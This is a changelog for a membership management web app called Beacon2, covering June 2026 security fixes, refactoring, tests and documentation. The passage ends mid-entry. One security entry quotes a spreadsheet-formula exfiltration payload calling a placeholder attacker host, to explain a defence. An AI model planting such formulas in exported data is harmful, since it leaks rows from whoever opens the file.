# Beacon2 Changelog

All notable changes are documented here.
Format: `## [version] — YYYY-MM-DD` with bullet points per change.

---

## [Unreleased] — 2026-06-14

### Added
- **Licensing & legal hygiene (2026-06-14 review, Chunk 1)** —
  - Root `LICENSE` declaring Beacon2 **proprietary / all rights reserved**
    (Copyright (c) 2026 Peter Cooper), noting the project is a clean-room
    reproduction not affiliated with the Third Age Trust.
  - `SECURITY.md` vulnerability-disclosure policy directing reports through
    GitHub private security advisories, with supported scope and a
    do-not-include-real-PII note.
  - `docs/FromBeacon/README.md` provenance statement: the original Beacon
    reference files (© John Franklin 2017) are retained **for reference only**,
    with all original copyright retained and no claim of redistribution rights.
- **Structured logging baseline (2026-06-14 review, Chunk 2)** —
  - New `backend/src/utils/logger.js`: a minimal, dependency-free leveled
    logger (`error`/`warn`/`info`/`debug`) gated by `LOG_LEVEL` (default `info`
    in production, `debug` otherwise). Each call emits one line —
    timestamp, level, message, optional JSON context — backed by the matching
    `console` method, with safe handling of non-serialisable context.
  - Unit tests (`logger.test.js`) covering console routing, level gating,
    line format, and circular-context safety.
  - A `CLAUDE-STANDARDS.md` rule: use `logger`, never `console.*`, and never
    log PII/secrets in app logs.

### Changed
- **Service-layer extraction for finance transactions (2026-06-14 review,
  Chunk 3)** — introduced the marquee maintainability pattern on one route
  end-to-end. New `backend/src/services/transactionService.js` now holds all
  transaction business logic and data access (`list`/`get`/`create`/
  `bulkSetPending`/`update`/`delete`/`refund`), and
  `routes/finance/transactions.js` (747 → 179 lines) is a thin controller that
  validates input with Zod at the route boundary and delegates to the service,
  mirroring `services/authService.js`. Behaviour-preserving: the existing
  finance route tests pass unchanged. The two larger offenders
  (`routes/backup/restore.js`, `routes/members/crud.js`) are recorded in
  `KNOWN-ISSUES.md` for the same treatment in follow-up sessions.
- `CONTRIBUTING.md` Licensing section now points at the new `LICENSE`,
  `SECURITY.md`, and `docs/FromBeacon/README.md` instead of saying a licence is
  undecided.
- **Documentation readability (2026-06-14 review, Chunk 8)** —
  - Added a linked table of contents to `CLAUDE-REFERENCE.md` (26 module
    sections) so the ~1,900-line reference is navigable.
  - Archived older `CHANGELOG.md` entries (versions **0.9.7 and earlier**) to
    `docs/history/CHANGELOG-archive.md`, leaving a pointer; the main changelog
    now retains 0.10.5 onward.
  - Added a "for human contributors" banner to `README.md` clarifying that the
    `CLAUDE*.md` files are session tooling, mirroring the note in
    `CONTRIBUTING.md`.
- Reworded the stale system-admin auth comment in `frontend/src/App.jsx`
  (KI #26): it no longer claims `sessionStorage` and now points at the
  in-memory sys-token in `lib/api/system.js`.
- **Validation & error-message conventions documented (2026-06-14 review,
  Chunk 4)** — added two house rules to `CLAUDE-STANDARDS.md` so existing,
  already-consistent patterns are intentional rather than accidental:
  - **Zod schema location** — inline by default; extract to
    `backend/src/schemas/` only when a schema is genuinely shared by two or more
    route modules (as `schemas/common|groups|teams.js` already do). No mass
    extraction of the ~35 single-use inline schemas.
  - **Error-message wording** — generic, non-enumerating messages on
    unauthenticated/recovery endpoints (login, forgotten-password, verification
    links); specific, helpful messages on authenticated/authorised endpoints.
    Verified the codebase already follows this (tenant + portal login,
    sys-admin login, and forgotten-password are all generic; `User not
    found.`/`Tenant not found.` appear only on authenticated routes), so no code
    changes were required.

### Security
- **Security OPEN-item reconciliation (2026-06-14 review, Chunk 5)** —
  - **Refresh-token / session invalidation without Redis (KI #3)** — added a
    Postgres fallback. New per-tenant `session_invalidations` table; when
    `USE_REDIS=false`, `invalidateUserSessions` / `isSessionInvalidated` /
    `purgeTenantInvalidations` (in `utils/redis.js`) read and write that table
    instead of no-opping, so a revoked role/password is enforced on the user's
    next request rather than only after the access token expires. New
    `redis.test.js` covers the fallback.
  - **Privilege-string collision hardening (KI #7)** — centralised
    `resource:action` construction in `encodePrivilege()` in
    `shared/constants.js`, now used by `requirePrivilege`, `hasPrivilege`,
    `computePrivileges` (backend) and `can` (frontend). The helper rejects an
    action containing `:`, so the action is always the unambiguous final
    segment; the string format is unchanged (no token re-issue needed).
  - **CSP enforce-flip runbook (KI #25)** — `DEPLOYMENT.md` now has a
    step-by-step "Enforcing the Content-Security-Policy" runbook (collect
    reports → resolve → tighten `connect-src` → rename the header → verify →
    rollback). The flip itself stays a post-deploy step.
- **Removed PII from operational logs (2026-06-14 review, Chunk 2)** — replaced
  all 60+ `console.*` call sites across backend non-test code (auth recovery,
  portal auth/profile/renewals/helpers, online-join email helpers, migrate/seed,
  redis, error handler, server startup) with the new `logger`. In the process,
  log lines no longer include recipient/member email addresses, names, the
  online-join payment link, or reset/verification tokens — only error messages,
  ids, counts and booleans are logged now.

---

## [Unreleased] — 2026-06-12

### Security
- **Email & upload hardening (ImprovementPlan Chunk 5, findings S9/S10/S13)** —
  - Member photo uploads (admin and portal) now validate the file's leading
    bytes against the declared `image/jpeg|png|gif` type and reject mismatches,
    closing the mislabelled-payload vector.
  - Email attachment filenames are sanitised to a safe basename (path and
    control characters stripped, whitespace padding collapsed, length capped).
  - `/email/send` now constrains both `fromEmail` and `replyTo` to the
    sender's own permitted addresses (member email + offices held), preventing
    officer/address impersonation by anyone holding `email:send`.
  - `/email/send` and `/system/restore` multer configs now whitelist MIME
    types and cap file counts instead of accepting any type.
  - The SendGrid delivery-status refresh is capped at 100 per-recipient API
    lookups per click, bounding outbound-API amplification.
  - The broadcast sender address is now configurable via `EMAIL_FROM_ADDRESS`
    (falling back to `RECOVERY_FROM_ADDRESS`) instead of being hard-coded.
  - Tenant restore purges that tenant's Redis session-invalidation marks, so
    freshly-restored users' sessions are no longer treated as pre-revoked.

### Added
- **CI & E2E improvements (ImprovementPlan Chunk 12, findings T2/P1/P2)** —
  - Test coverage reporting via `@vitest/coverage-v8` in both packages: a new
    `test:coverage` script and a `coverage` config block (v8 provider;
    `text-summary` + `html` + `lcov` reporters). CI now runs the suites with
    coverage and uploads the `backend-coverage` / `frontend-coverage` HTML
    reports as build artifacts. No coverage threshold gates CI — surfacing only.
  - A root `docker-compose.yml` plus `backend/Dockerfile` and
    `frontend/Dockerfile` (and a root `.dockerignore`) bring up Postgres +
    Redis + backend + frontend locally, so the app — and the Playwright E2E
    suite — can run without a deployed staging instance. The compose backend
    seeds the system-admin the E2E suite expects by default, so local E2E runs
    with no extra configuration (documented in `e2e/.env.example`, `e2e/README.md`,
    `README.md`, and `DEPLOYMENT.md`).
  - `.github/dependabot.yml` — weekly grouped minor/patch updates for the
    `/backend`, `/frontend`, and `/e2e` npm packages and for GitHub Actions.
  - Decisions recorded: the E2E suite stays **non-gating** (manual / post-deploy)
    and the frontend CSP stays **report-only** for now — both with the rationale
    captured in `docs/ImprovementPlan.md` and `KNOWN-ISSUES.md` #25, and the CSP
    enforce-mode flip documented as the remaining step in `DEPLOYMENT.md`.
- **Backend tests for previously-untested routes (ImprovementPlan Chunk 7,
  findings C1/M4/T4)** — new unit suites covering the routes that had no
  coverage: `system.test.js` (sys-admin tenant CRUD, set-temp-password,
  settings, feature-config), `teams.test.js` (team CRUD, members, events),
  `public.test.js` (tenant resolution, join-config, portal register/verify,
  public groups/calendar), `portal.test.js` (portal auth guard plus
  home/groups/personal-details), and per-file finance suites
  `financeTransfers.test.js`, `financeReconciliation.test.js`,
  `financeStatements.test.js`. A new shared `__tests__/mocks.js` provides
  `dbMock`/`redisMock`/`auditMock`/`passwordMock` factories that remove the
  copy-pasted mock boilerplate (M4, backend half). CLAUDE-REFERENCE §12 now
  documents these helpers and records that SQL is exercised only by E2E (T4).
- **Shared event-filter builders `backend/src/utils/eventFilters.js`**
  (ImprovementPlan Chunk 6, findings N1/N3) — `buildCalendarEventFilters()` and
  `buildPortalCalendarFilters()` replace five byte-identical inline WHERE-clause
  blocks across `calendar.js` (events / pdf / excel) and `portal.js`
  (calendar / pdf). Both validate the query string with Zod, so a malformed
  `from`/`to` now returns **422** at the edge instead of **500**-ing on the
  Postgres `::date` cast. Unit coverage in `__tests__/eventFilters.test.js`.
- **Audit logging on groups and teams (ImprovementPlan Chunk 6, finding C6)** —
  the group and team create/update/delete handlers now write `logAudit()`
  entries, matching members/finance.
- **Upload-hardening helper `backend/src/utils/uploads.js`** (ImprovementPlan
  Chunk 5) — shared image magic-byte sniffer, attachment-filename sanitiser,
  and a reusable multer MIME `fileFilter` with spreadsheet/attachment
  whitelists, with unit coverage in `__tests__/uploads.test.js`.
- **Frontend test quality (ImprovementPlan Chunk 11, findings C2/M4)** — added
  behaviour/interaction tests (form fill, submit, validation, and API-call
  assertions) modelled on `CookieConsent.test.jsx` for eight critical pages:
  Login, ChangePassword, VenueEditor, MemberClassEditor, RoleEditor, UserEditor,
  TransferMoney, and JoinForm. Added unit tests for the shared components and
  helpers that previously had none: `Button`, `FormError`, `DateInput`,
  `SortableHeader`, and the new `lib/a11y.js`. New shared `__tests__/testUtils.jsx`
  (router-render helpers + `authValue` factory) reduces per-file boilerplate
  (M4, frontend half), and `__tests__/setup.js` now stubs `window.scrollTo` /
  `scrollIntoView` so form-submit tests run without jsdom "Not implemented"
  noise. Frontend suite: 53 → 59 files, 140 → 196 tests.

### Changed
- **Documentation rationalisation** — the 2026-06 review effort is complete, so
  its three driver documents (`ImprovementPlan.md`, `CODEBASE-RECOMMENDATIONS.md`,
  `SECURITY-REVIEW.md`) were archived under `docs/history/` (with a README
  explaining their provenance). `KNOWN-ISSUES.md` is now stated explicitly as the
  single living backlog and its cross-links point at the archived copies. No open
  items were lost — all deferred work was already tracked in `KNOWN-ISSUES.md`.
  `Beacon2 Project Definition.md` had its stale "April 2026" header refreshed to
  June 2026 / v0.11.0 and is now cross-referenced with `README.md` as the
  canonical module/route/page inventory (README being the shorter repo-orientation
  map), removing the ambiguity over which layout tree is authoritative.
- **Backend consistency cleanup (ImprovementPlan Chunk 6, findings N2/N6)** —
  documented a single response-shape + status-code convention in
  `CLAUDE-STANDARDS.md` (`{ error }` for all error bodies via `AppError`;
  `{ message }` only for action-only successes; 201 create / 200 fetch+update).
  Replaced the lone bare `throw new Error` in `membershipCards.js` with
  `AppError(…, 404)`, and hoisted scattered pagination limits to named constants
  (`EVENT_SEARCH_DEFAULT_LIMIT`/`EVENT_SEARCH_MAX_LIMIT` in `calendar.js`,
  `CONSENT_HISTORY_MAX_ROWS` in `giftAid.js`).
- **Frontend deduplication (ImprovementPlan Chunk 8, findings M3/M5/M6/N4/N5)** —
  added shared modules `hooks/useAsyncLoad.js`, `lib/dateFormatters.js`,
  `lib/storageKeys.js`, `lib/routes.js` and `components/FormError.jsx`
  (documented in CLAUDE-REFERENCE §11):
  - Replaced ~25 inline `fmtDate`/`fmtTime`/`fmtTimestamp`/`formatDate` helpers
    across pages and components with the shared formatters (N4).
  - Hoisted all sessionStorage/localStorage keys into `storageKeys.js` and the
    frequently cross-referenced route targets into `ROUTES` (N5). Privilege
    strings left inline by owner decision.
  - Adopted the shared `FormError` across all 8 form pages with inline
    field-error rendering (~50 sites), and `useAsyncLoad` in the 8 clean
    single-payload pages/components (M3).
  - Confirmed the three named nested-component definitions (M5) and the
    derived-state-to-`useMemo` case (M6) were already resolved in earlier work.
  - No behaviour change; frontend suite green (53 files, 140 tests), lint and
    Prettier clean.
- **Split oversized backend route files (ImprovementPlan Chunk 9, finding M1)** —
  refactored the seven oversized route files into sub-router directories
  following the `finance/` precedent. Pure moves, no behaviour change:
  - `routes/backup.js` (2,353 lines) → `routes/backup/` with `export.js`
    (the `/export` route plus all sheet builders), `restore.js` (the
    `clearTenantData`/`resetSequences`/`restoreBeacon2`/`restoreBeacon`
    helpers consumed by `system.js`), a shared `helpers.js` (the `str` cell
    coercer used by both), and `index.js` (applies `requireAuth`, mounts the
    export router, re-exports the restore helpers).
  - `routes/members.js` (1,970 lines) → `routes/members/` with `list.js`
    (read-only listings, statistics, validation, download/export),
    `lifecycle.js` (renewals/renew/non-renewals/lapse), `crud.js`
    (single-member fetch/create/update/delete/photo/groups), a shared
    `helpers.js` (`resolveGiftAidAmount`, `deriveInitials`), and `index.js`
    (mounts the literal-path routers before the `/:id` CRUD router so route
    matching order is preserved).
  - `routes/portal.js` (1,798 lines) → `routes/portal/` with `profile.js`
    (the `/home` dashboard, personal-details GET/PATCH, photo upload/delete/get,
    change-password, request-card), `groups.js` (browse plus join/leave),
    `calendar.js` (event list and PDF download), `renewals.js` (renewal-info,
    renew, renewal-confirm), a shared `helpers.js` (date formatters and the
    stubbed email helpers), and `index.js` (owns the portal-auth middleware and
    feature gate, then mounts the four sub-routers). `public.js` now imports
    `portal/index.js`.
  - `routes/groups.js` (1,464 lines) → `routes/groups/` with `list.js`
    (group listing plus list-level Excel/PDF download, `groups_list` privilege),
    `crud.js` (single-group fetch/create/update/delete, `group_records_all`),
    `members.js` (membership listing, member download, add/remove and bulk ops),
    `events.js` (the schedule sub-resource), `ledger.js` (the group-ledger
    sub-resource with its `hasLedgerAccess` helper), and `index.js` (owns the
    shared `requireAuth` + `requireFeature('groups')` middleware, then mounts the
    list router before the `/:id` CRUD router so route matching order is
    preserved). No shared `helpers.js` was needed — each field-def/schema/access
    helper is local to one sub-router. `app.js` now imports `groups/index.js`.
  - `routes/public.js` (1,455 lines) → `routes/public/` with `join.js` (the
    online-joining and PayPal flow: join-config, join, payment-confirm,
    resume-payment, email-payment-link, plus the join confirmation/officer
    notification email stubs), `portalAuth.js` (the unauthenticated portal
    credential endpoints register/verify-email/login/forgot-password/
    reset-password, with the portal-auth rate limiter, lockout helper, and
    reset/verification email senders), `read.js` (the public groups and
    calendar information pages), and `index.js` (owns the `resolveTenant`
    middleware, mounts the three sub-routers, then mounts the authenticated
    portal app router at `/:slug/portal/app`). `app.js` now imports
    `public/index.js`.
  - `routes/teams.js` (1,267 lines) → `routes/teams/` with `list.js` (team
    listing plus list-level Excel/PDF download, `groups_list` privilege),
    `crud.js` (single-team fetch/create/update/delete, `group_records_all`),
    `members.js` (membership listing, member download, add/remove and bulk ops),
    `events.js` (the schedule sub-resource), `ledger.js` (the team-ledger
    sub-resource with its `hasLedgerAccess` helper), and `index.js` (owns the
    shared `requireAuth` + `requireFeature('teams')` middleware, then mounts the
    list router before the `/:id` CRUD router so route matching order is
    preserved). `app.js` now imports `teams/index.js`.
  - `routes/calendar.js` (945 lines) → `routes/calendar/` with `events.js` (the
    read side: aggregate view, PDF/Excel exports, member/event-type lookups,
    event search, single-event lookup, financials — with the literal
    `/events/pdf`, `/events/excel`, and `/events/search` routes defined before
    `/events/:eventId` so the param does not capture them), `openEvents.js` (the
    non-group `/open-events` CRUD), `eventMembers.js` (the attendance
    sub-resource), a shared `helpers.js` (the `fmtDateUK`/`fmtTime` formatters
    used by both `events.js` and `eventMembers.js`), and `index.js` (owns the
    shared `requireAuth` + `requireFeature('events')` middleware, then mounts the
    three sub-routers). `app.js` now imports `calendar/index.js`.
  - Route registrations verified identical before/after; backend suite green
    (45 files, 593 tests), lint and Prettier clean. This completes Chunk 9 —
    all seven oversized backend route files are now split into sub-router
    directories.
- **Split oversized frontend pages — first two (ImprovementPlan Chunk 10,
  finding M2)** — extraction only, no behaviour change:
  - `pages/members/MemberEditor.jsx` (2,317 → 1,994 lines). Pure helpers and
    constants (`todayIso`, `computeNextRenewal`, `BLANK_FORM`, `TITLES`) moved to
    `members/memberEditorUtils.js`; the shared Tailwind class strings to
    `members/memberEditorStyles.js`; the read-only Groups/Teams/Ledger block to
    `members/MemberLedgerSection.jsx`; and the photo upload/preview block to
    `members/MemberPhotoSection.jsx` (upload state and handlers stay in the
    parent and are passed as props).
  - `components/EntityMembers.jsx` (722 → 583 lines). The "Do with selected"
    bulk-action bar and download field-picker moved to
    `components/EntityBulkActions.jsx`; the "Add a member" panel to
    `components/EntityAddMembers.jsx` — both presentation-only, with all state
    and handlers passed in from the parent.
  - `pages/groups/GroupRecord.jsx` (1,128 → 152 lines). The two existing
    top-level sub-components moved to their own files: `groups/GroupDetails.jsx`
    (the Details tab) and `groups/GroupLedger.jsx` (the Group Cash tab). The page
    now just owns tab routing and renders the sub-components.
  - `pages/teams/TeamRecord.jsx` (889 → 125 lines). Likewise: `teams/TeamDetails.jsx`
    and `teams/TeamLedger.jsx`.
  - `pages/calendar/Calendar.jsx` (1,125 → 861 lines). The two read-only event
    tables moved to `calendar/CalendarMonthTable.jsx` (the "calendar" view) and
    `calendar/CalendarFlatTable.jsx` (the sortable flat-list view); the pure
    helpers (`defaultFrom`, `defaultTo`, `googleMapsUrl`) to
    `calendar/calendarUtils.js`. The page still owns the filter form, the "other"
    event-management section, and the add-event form.
  - Frontend suite green (53 files, 140 tests), lint 0 errors, Prettier clean.
- **Split oversized frontend pages — remaining five (ImprovementPlan Chunk 10,
  finding M2)** — extraction only, no behaviour change:
  - `pages/finance/TransactionEditor.jsx` (1,097 → 792 lines).
    `finance/transactionEditorUtils.js` (today/BLANK/PAYMENT_METHODS + INP/LBL
    class strings); `TransactionAssociations.jsx` (member/group/team/event
    pickers); `TransactionGiftAidSection.jsx`; `TransactionCategories.jsx`.
  - `pages/finance/CreditBatches.jsx` (1,028 → 446 lines).
    `finance/creditBatchesUtils.js` (style strings + fmtAmt/toISODate);
    `CreditBatchPicker.jsx` (shared unbatched-transaction selection table,
    deduplicating the near-identical create + add-to-batch tables);
    `CreditBatchList.jsx`; `CreditBatchDetail.jsx`; `CreditBatchAddTxns.jsx`;
    `CreditBatchCreate.jsx`.
  - `pages/members/MemberList.jsx` (921 → 453 lines). `members/memberListConstants.js`
    (DOWNLOAD_FIELDS, ALPHABET); `MemberListFilters.jsx`; `MemberListTable.jsx`
    (select controls + sortable table); `MemberListBulkActions.jsx`.
  - `pages/finance/FinanceLedger.jsx` (892 → 395 lines). `finance/financeLedgerUtils.js`
    (VIEWS/VIEW_LABELS/YEARS + fmtDate/fmtAmount/isEligible); `FinanceLedgerControls.jsx`;
    `FinanceLedgerTable.jsx`.
  - `pages/system/SystemDashboard.jsx` (832 → 458 lines). `system/systemDashboardConstants.js`
    (EMPTY_FORM, SECTIONS, getVal); `CreateTenantForm.jsx`; `RestoreBackupSection.jsx`;
    `RestoreConfirmModal.jsx`; `FeatureConfigModal.jsx`.
  - All extracted parts are presentation-only with state/handlers passed in from
    the parent. Frontend suite green (53 files, 140 tests), lint 0 errors,
    Prettier clean. This completes Chunk 10 — every M2 page originally flagged is
    now split.

### Fixed
- **Keyboard-accessible sortable column headers (ImprovementPlan Chunk 11,
  finding O5)** — the shared `SortableHeader` component (used by ~17 list pages)
  and the inline forename/surname split headers (MemberList, EntityMembers,
  MembershipCards, MembershipRenewals, NonRenewals, RecentMembers) are now
  focusable and activate on Enter/Space, and `SortableHeader` exposes `aria-sort`
  reflecting the current sort state. New shared helper `lib/a11y.js`
  (`clickableKeyProps`) provides the role/tabIndex/onKeyDown bundle.
- **Form-label associations (ImprovementPlan Chunk 11, finding O5)** — continued
  the `htmlFor`/`id` sweep across VenueEditor, MemberClassEditor (incl. `aria-label`
  on the monthly-fee grid inputs), ChangePassword, and RoleEditor, so their fields
  are programmatically labelled for screen readers and `getByLabelText`.
- **Duplicated security findings in `KNOWN-ISSUES.md`** — the Chunk 4 and Chunk 5
  edits had appended a second copy of findings #8–#22, leaving two contradictory
  blocks (each showing only one chunk's fixes). Consolidated back to a single,
  consistent 1–26 list with correct status tags, and normalised the non-standard
  `[RESOLVED]` tag to `[FIXED]`.
- **Shared password policy & temp-password generator (ImprovementPlan Chunk 4)** —
  new `backend/src/utils/passwordPolicy.js` exports `passwordSchema` (10–72
  chars, at least one upper, lower, and digit) and a `crypto.randomInt`-based
  `generateTempPassword()`. The schema is now the single source of truth for
  `PATCH /users`, `POST /system/tenants`, `/auth/change-password`,
  `/auth/force-change-password`, and all portal register/reset/change flows.
- **Targeted portal-auth rate limiter (ImprovementPlan Chunk 4, finding S11)** —
  a dedicated 20/15 min/IP limiter (env `PORTAL_AUTH_RATE_LIMIT_MAX`) now guards
  the portal register, login, forgot-password, reset-password, and verify-email
  endpoints, in addition to the global limiter.

- **Linting & formatting baseline (ImprovementPlan Chunk 3, findings T1/T2)** —
  added ESLint 9 (flat config) and Prettier to both `backend/` and
  `frontend/`. The frontend config uses `eslint-plugin-react` plus the
  stable `eslint-plugin-react-hooks` v5 (`rules-of-hooks` as an error,
  `exhaustive-deps` as a warning). New `lint`, `lint:fix`, `format`, and
  `format:check` scripts in each package. CI (`ci.yml`) now runs `lint`
  and `format:check` for both packages and was bumped from Node 20 to
  Node 22 to match the e2e workflow. Added a root `.editorconfig`,
  `.prettierrc.json` (single quotes, semicolons, trailing commas, 100-col),
  and `.prettierignore`.

- **`docs/ImprovementPlan.md`** — consolidated full-codebase review
  (security, completeness, consistency, maintainability, readability,
  standards, production readiness). Findings are grouped into 12
  numbered implementation chunks, each sized for one session, and
  cross-referenced to SECURITY-REVIEW.md, KNOWN-ISSUES.md, and
  CODEBASE-RECOMMENDATIONS.md (all prior fixed findings re-verified).
  Headline new finding: `routes/email.js` and `routes/letters.js` use
  `req.tenantSlug`, which is undefined on authenticated routes, and
  `tenantQuery()` accepts the coerced string `"undefined"` as a slug —
  see Chunk 1. No code changes this session.

### Changed
- **Whole codebase reformatted with Prettier** (ImprovementPlan Chunk 3) —
  a one-time, behaviour-preserving reflow of all backend and frontend
  source plus `shared/constants.js`, committed separately from the
  tooling/lint-fix changes. No logic changes.

### Fixed
- **Security: auth & enumeration hardening (ImprovementPlan Chunk 4,
  findings S2–S8, S11, S12)** —
  - **Temp-password modulo bias (S2)** — replaced biased `byte % length`
    selection with `crypto.randomInt` in the shared generator.
  - **Inconsistent password policy (S4)** — unified behind `passwordSchema`
    (see Added); `PATCH /users` no longer accepts weak 8-char passwords.
  - **Sys-admin state check (S7)** — `requireSysAdmin` now re-loads the
    sys-admin each request and rejects (401) if the account is missing or
    inactive, instead of trusting the token for its full lifetime.
  - **Portal session invalidation (S3)** — `requirePortalAuth` honours the
    Redis invalidation marker; portal password change/reset now set it.
  - **Account-enumeration (S5)** — `/auth/recover` and
    `/portal/forgot-password` send their emails fire-and-forget so response
    time no longer leaks account existence; portal login runs a throwaway
    bcrypt comparison for unknown emails to equalise timing.
  - **Verification tokens no longer logged (S6)** — portal register and
    email-change email the verification link via SendGrid (or log a token-free
    warning when SendGrid is unset) rather than printing it to stdout.
  - **Slug regex unified (S8)** — the public `resolveTenant` guard now matches
    `utils/db.js` (`[a-z0-9_]+`), so a hyphenated slug returns 400 at the edge
    instead of 500 inside `tenantQuery`.
  - **CSRF origin check (S12)** — `/auth/refresh` gates the Origin check on
    `CORS_ORIGIN` being set rather than on `NODE_ENV`, so a mis-set `NODE_ENV`
    can no longer silently disable it.
- **ESLint violations cleared (ImprovementPlan Chunk 3)** — removed unused
  imports and variables and dropped dead destructured bindings across 27
  backend and ~25 frontend files (e.g. unused `useNavigate`/`Link` imports,
  an orphaned `headers` object in `lib/api.js`, dead `PAGE_W`/`PAGE_H` and
  `monthName`/`MONTHS` locals). The intentional PayPal stub (`utils/paypal.js`)
  and the retained-for-reference role-privilege migration (`utils/migrate.js`)
  carry targeted `eslint-disable` comments instead.
- **Tenant-context bug in email & letters routes (ImprovementPlan Chunk 1,
  finding S1)** — `routes/email.js` (19 sites) and `routes/letters.js`
  (5 sites) read `req.tenantSlug`, which is only set by the public-routes
  middleware and is `undefined` on these authenticated routes. The slug
  regex in `tenantQuery()` coerced `undefined` to the string `"undefined"`,
  which *passed* validation and targeted a non-existent `u3a_undefined`
  schema, so every query on the Email and Letters screens failed at
  runtime against a real database. Mocked unit tests could not catch this.
  Both files now use `req.user.tenantSlug` (the authenticated user's
  tenant, matching `members.js` and every other authenticated route).

### Security
- **`tenantQuery()` / `withTenant()` reject non-string slugs** —
  `utils/db.js` now throws `Invalid tenant slug: expected string…` before
  the regex check, so a missing/undefined slug fails loudly instead of
  silently coercing to `"undefined"` and querying the wrong schema.
  Regression tests added: `db.test.js` (guard rejects undefined/null/bad
  slugs), plus tenant-scope assertions in `letters.test.js` and a new
  `email.test.js` confirming queries are scoped to the caller's tenant.

### Docs & repo hygiene (ImprovementPlan Chunk 2)
- **`CONTRIBUTING.md`** added — setup, branching, coding conventions, tests,
  and the human entry point alongside `README.md`.
- **`backend/.env.example` and `frontend/.env.example`** added — every env var
  enumerated with required/optional status, so the README's `cp .env.example
  .env` step now works.
- **`docs/BeaconUG/README.md`** added — marks the original-Beacon User Guide as
  legacy reference-only and points to the Beacon2 guide.
- **README quickstart corrected** to match reality: `npm run build`
  (prisma generate) then `npm run dev` (which runs `prisma db push` + seeds the
  first admin automatically); fixed the stale `pages/misc/*` reference.
- **KNOWN-ISSUES.md** items now carry `[OPEN]`/`[ACCEPTED]`/`[DEFERRED]` status
  tags with a legend, and cross-link `docs/ImprovementPlan.md` /
  `CODEBASE-RECOMMENDATIONS.md`; the latter now cross-links back.
- **Placeholder credentials neutralised** — `render.yaml` `SEED_ADMIN_EMAIL`
  is now `sync: false` (no `admin@beacon2.local` default); `e2e/.env.example`
  no longer ships `ChangeMe123!` / `TestAdmin99!`.
- **CLAUDE.md** now opens with a note that the `CLAUDE-*.md` files are
  AI-session tooling and humans should start at `README.md`/`CONTRIBUTING.md`;
  Project Definition version line bumped 0.9.9 → 0.11.0.
- **Deferred (owner decision):** repository `LICENSE` and a `docs/FromBeacon/`
  provenance README — both logged in `KNOWN-ISSUES.md`.

## [Unreleased] — 2026-06-10

### Security
- **`force-change-password` now requires `must_change_password`** —
  `routes/auth.js` re-reads the flag before allowing the password +
  security Q&A overwrite. Previously any authenticated user could
  POST `/auth/force-change-password` and rewrite their own recovery
  Q&A without supplying the current password. (KNOWN-ISSUES #1)
- **Password changes now revoke other sessions** — both
  `/auth/change-password` and `/auth/force-change-password` flip
  `refresh_tokens.revoked = true` for the user and call
  `invalidateUserSessions()`. Stolen refresh tokens can no longer
  outlive the password change. The user's own access token continues
  to work until it expires (matches admin password-change). Also
  added an audit-log entry for `/change-password` (it had none).
  (KNOWN-ISSUES #2)
- **Portal login now locks accounts after repeated failures** —
  `routes/public.js` mirrors the admin-login pattern using two new
  columns on `members` (`portal_failed_login_count`,
  `portal_locked_until`) and the existing `MAX_FAILED_LOGINS` /
  `LOCKOUT_MINUTES` env vars (default 5 attempts / 15 min). Failures
  and lockouts are written to the audit log. (KNOWN-ISSUES #3)
- **Portal forgot-password email wired up** — `/portal/forgot-password`
  now sends the reset link via SendGrid (mirroring the recovery-email
  pattern in `auth.js`). When `SENDGRID_API_KEY` is unset it logs a
  warning instead of the previous `console.log` of the plaintext
  token, and still returns the generic "If an account exists…"
  response so enumeration protection is preserved. (KNOWN-ISSUES #4)
- **JoinPending open-redirect closed** — `pages/public/JoinPending.jsx`
  now gates `window.location.href = redirectUrl` with
  `isSafePaymentRedirect()`, matching the existing guards on
  `ResumePayment` and `PortalRenewal`. Defence-in-depth against a
  compromised or mis-configured backend returning a URL outside
  same-origin / paypal.com.
- **CSP + HSTS headers** — `frontend/vercel.json` now ships a
  Content-Security-Policy in report-only mode and a 2-year HSTS header
  with `includeSubDomains; preload`. The CSP defaults are tight
  (`script-src 'self'; object-src 'none'; frame-ancestors 'none'; …`)
  but `connect-src 'self' https:` and `style-src` allow `'unsafe-inline'`
  so the report-only deploy doesn't break Vite/Tailwind output. After a
  deploy window of clean reports, switch the header key from
  `Content-Security-Policy-Report-Only` to `Content-Security-Policy`
  and consider tightening `connect-src` to the actual backend host.
- **npm audit clean-up** — `npm audit fix` applied in both `backend/`
  and `frontend/`. Backend: 7 vulnerabilities (2 high, 5 moderate) →
  2 moderate; remaining two are `uuid<11.1.1`'s missing buffer-bounds
  check on the v3/v5/v6 `buf` argument, which doesn't affect Beacon2's
  v4-only usage. Frontend: 4 moderate → 0 (postcss XSS-via-CSS,
  react-router protocol-relative open redirect, ws memory disclosure,
  axios prototype-pollution chain). No `package.json` changes were
  needed — patches landed via lock-file updates.
- **HTML injection via email tokens** — `resolveTokens()` now returns a
  `bodyHtml` variant in addition to `body`. Token values (member
  forenames, surnames, partner fields, etc.) are HTML-escaped in
  `bodyHtml` so a member whose forename contains markup can't smuggle
  links or scripts into templated broadcasts that resolve their token
  for *other* recipients (partner / shared-template paths). The
  surrounding admin-authored body is left unescaped. `routes/email.js`
  now uses `bodyHtml` for the html field of outgoing SendGrid messages.
- **PayPal `initiatePayment()` refuses in production** —
  `utils/paypal.js`, matching the chunk 4 hardening of
  `verifyPaymentNotification()`. Throws unless `NODE_ENV !== 'production'`
  or `PAYPAL_STUB_ALLOW=true`. Prevents the stub from issuing fake
  payment IDs and "success" redirects in production, which would orphan
  Applicants and mislead operators.
- **CSV / spreadsheet formula injection defence** — new helper
  `utils/spreadsheet.js` (`sanitizeCell`, `sanitizeRowForExport`) prefixes
  any string starting with `=`, `+`, `-`, `@`, tab or CR with a single
  quote so Excel/Calc/Sheets treat it as a literal. Applied to every
  Excel/CSV export sink: full tenant backup (`backup.js`), member
  download, group/team/calendar/gift-aid downloads, finance and groups
  statements, address export (CSV/TSV/Excel), SQL Reports download, and
  membership-card data export. Without this, a member named e.g.
  `=HYPERLINK("http://attacker/?c="&A2,"click")` could exfiltrate the
  row when an admin opened the daily backup.
- **Restore no longer imports `password_hash` from the backup file** —
  `routes/backup.js:restoreBeacon2`. A malicious backup could otherwise
  plant a known-password account bound to Administration via the User
  roles sheet. Imported users now have NULL `password_hash`; the
  sys-admin must use "Set temporary password for all users" on the
  tenant before they can log in. The legacy Beacon-format restore path
  already used this pattern.
- **PayPal stub refuses to verify in production** — `utils/paypal.js`
  `verifyPaymentNotification()` now returns `verified: false` when
  `NODE_ENV === 'production'` unless `PAYPAL_STUB_ALLOW=true` is explicitly
  set. Closes the path where any unauthenticated caller could complete the
  `/public/:slug/payment-confirm` flow (flipping an Applicant to Current
  and recording a fake finance transaction) until real IPN verification is
